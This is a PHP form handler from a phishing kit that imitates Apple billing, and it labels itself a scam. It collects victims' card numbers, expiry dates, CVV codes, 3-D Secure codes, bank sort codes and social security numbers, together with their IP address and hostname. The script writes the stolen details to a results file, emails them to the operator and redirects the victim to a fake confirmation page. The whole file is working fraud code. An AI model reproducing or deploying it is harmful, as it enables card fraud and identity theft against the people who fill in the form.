<?php
error_reporting(0);

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[~]Scam By Unkown (Credit card Rezult)[~]<br />";
$message .= "|C /R / D   : ".$_POST['9liwa-1']."<br />";
$message .= "|EXP / MM / YY: ".$_POST['9liwat-3']."<br />";
$message .= "|C / V / V: ".$_POST['9liwat-2']."<br />";
$message .= "|S/R/T - C/D : ".$_POST['karr-1']."<br />";
$message .= "|3/D - S/C/R   : ".$_POST['karr-2']."<br />";
$message .= "|S/S/N    : ".$_POST['zkoka-1']."<br />";
$message .= "|---------------|Info|-------------------|<br />";
$message .= "|Client IP: ".$ip."<br />";
$message .= "|HostName : ".$hostname."<br />";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----<br />";
$message .= "[~]Scam By Unkown (Credit card Rezult)[~]<br />";
$send = "Your@email.email";

$subject = "~ Billing Rezult ~ | $ip";


$open_rezult_file = fopen("../apple_rezult.html","a"); // spam rezult in file okkkkkk becarful
fwrite($open_rezult_file,$message); // spam rezult in file okkkkkk becarful
include"../cssisma/applejava.php"; // Javascript file to protect scam becarful
mail("$send", "$subject", $message);   
echo '<META http-equiv="refresh" content="0;URL=../confirming.html"> ';
?>